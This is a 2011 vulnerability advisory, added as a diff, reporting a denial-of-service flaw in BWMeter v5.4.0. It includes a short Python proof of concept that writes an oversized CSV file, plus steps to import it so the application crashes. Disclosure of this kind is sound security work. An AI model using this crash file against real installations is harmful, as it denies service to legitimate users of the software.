@@ -1,0 +1,71 @@
+GotGeek Labs
+http://www.gotgeek.com.br/
+
+BWMeter v5.4.0 (.csv) Denial of Service
+
+
+
+[+] Description
+
+BWMeter is a powerful bandwidth meter, monitor, traffic controller and
+firewall, which measures, displays and controls all traffic to/from your
+computer or on your network.
+
+
+
+[+] Information
+
+Title: BWMeter v5.4.0 (.csv) Denial of Service
+Advisory: gg-002-2011
+Date: 02-14-2011
+Last update: 02-16-2011
+Link: http://www.gotgeek.com.br/pocs/gg-002-2011.txt
+Tested on: Windows XP SP3
+
+
+
+[+] Vulnerability
+
+BWMeter is affected by denial of service vulnerability. 
+Successful exploitation of the vulnerability allows an attacker to crash the
+vulnerable application, denying service to legitimate users.
+
+Affected Versions:
+BWMeter v5.4.0
+
+Other versions may also be vulnerable.
+
+
+
+[+] Proof of Concept/Exploit
+
+#!/usr/bin/python
+#
+
+
+junk = "\x47\x47" * 2500
+
+try:
+    file = open('b0t.csv','w');
+    file.write(junk);
+    file.close();
+    print "\n[*] gotgeek labs"
+    print "[*] http://gotgeek.com.br\n"
+    print "[+] b0t.csv created."
+    print "[+] Open BWMeter.exe..."
+    print "[+] Statistics >> Import"
+    print "[+] and Select b0t.csv\n"
+except:
+    print "\n[-] Error.. Can't write file to system.\n"
+
+
+
+[+] References
+
+http://www.desksoft.com/BWMeter.htm
+
+
+
+[+] Credits
+
+b0telh0
